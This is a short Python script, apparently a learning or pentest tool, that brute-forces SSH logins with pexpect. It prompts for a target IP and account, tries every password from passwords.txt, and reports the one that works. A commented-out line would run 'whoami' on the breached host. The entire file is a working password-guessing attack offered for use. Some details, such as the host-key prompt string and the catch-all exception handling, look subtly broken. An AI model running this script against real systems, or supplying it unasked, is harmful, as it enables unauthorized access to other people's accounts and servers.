#!/usr/bin/python

import pexpect

PROMPT = ['# ', '>>> ', '> ', '\$ ']


def send_command(child,command):
	child.sendline(command)
	child.expect(PROMPT)
	print (child.before)

def connect(user, host, password):
	ssh_newkey = 'Are u sure you want to continue connecting!'
	connStr = 'ssh ' + user + '@'+ host
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
	if ret == 0:
		print ('[-] Error connecting')
		return
	if ret == 1:
		child.sendline('yes')
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
		if ret == 0:
			print ('[-] Error Connecting')
			return
	child.sendline(password)
	child.expect(PROMPT)
	return child


def main():
	host = raw_input('Enter IP Address of Target to Bruteforce: ')
	user = raw_input('Enter User Account you want to Bruteforce: ')
	file = open('passwords.txt', 'r')
	for password in file.readlines():
		password = password.strip('\n')
		try:
			child = connect(user, host, password)
			print ('[+] Password Found: ' + password)
#			send_command(child, 'whoami')
		except:
			print ('[-] Wrong Password ' + password)

main()
